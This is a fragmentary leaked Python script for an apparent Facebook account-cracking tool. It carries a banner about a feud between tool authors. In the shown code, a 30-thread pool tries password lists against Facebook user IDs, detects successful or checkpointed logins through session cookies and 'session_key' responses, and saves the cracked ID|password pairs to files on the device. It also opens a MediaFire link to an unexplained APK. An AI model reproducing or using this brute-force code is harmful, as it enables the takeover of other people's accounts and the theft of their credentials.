#SOURCE LEAKED BY :MR-AYAANI

#REASON : BECAUSE LOL BADSHAH

#WAS INTERFERE BETWEEN

#AYAANI & LKING FIGHT ðŸ˜Ž 
...
logo=("""\033[1;37m
 ...
 Facebook  : Mahummad AYAANI Tricks

 Tool Name : Mahummad AYAANI Tools
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AYAANI_VPN1.0.apk/file');menu()
                        ...
                        tks = ("Hi sarkar Sir, I Need To Buy Your Paid Mahummad AYAANI Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                with tred(max_workers=30) as AYAANI:     
                        ...
                        for psx in user:
                                ...
                                AYAANI.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [AYAANI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AYAANI=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in AYAANI:
                                ...
                                print('\r\r\033[1;32m [AYAANI-OK] %s | %s'%(ids,pas))

                                open('/sdcard/AYAANI-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in AYAANI:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [AYAANI-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/AYAANI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [AYAANI-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/AYAANI-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [AYAANI-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/AYAANI-OK.txt','a').write(uid+'|'+pas+'\n')
